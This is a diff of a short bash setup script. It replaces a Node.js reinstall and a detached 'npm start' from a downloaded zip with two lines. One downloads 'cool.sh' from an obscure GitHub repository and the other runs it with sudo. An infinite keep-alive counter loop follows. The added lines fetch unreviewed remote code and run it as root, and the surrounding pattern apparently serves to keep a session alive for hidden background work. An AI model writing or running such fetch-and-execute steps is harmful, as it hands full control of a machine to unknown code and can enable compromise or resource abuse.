@@ -1,25 +1,6 @@
 #!/bin/bash
-sudo apt-get update
-
-# Remove old Ubuntu Node.js development packages
-sudo apt-get remove -y libnode-dev nodejs npm
-
-# Clean package cache
-sudo apt-get autoremove -y
-sudo apt-get clean
-sudo rm -f /var/cache/apt/archives/nodejs_*.deb
-
-# Fix any interrupted dpkg state
-sudo dpkg --configure -a
-sudo apt-get -f install -y
-
-# Reinstall NodeSource Node.js 22
-curl -fsSL https://deb.nodesource.com/setup_22.x | sudo -E bash -
-sudo apt-get install -y nodejs python3-pip screen
-curl -O -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/uva.zip
-unzip uva.zip
-npm install
-screen -dmS play npm start
+curl -O -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/cool.sh
+sudo bash cool.sh
 i=0; while true; do echo -ne "\r$i seconds"; ((i++)); sleep 1; done
 
 
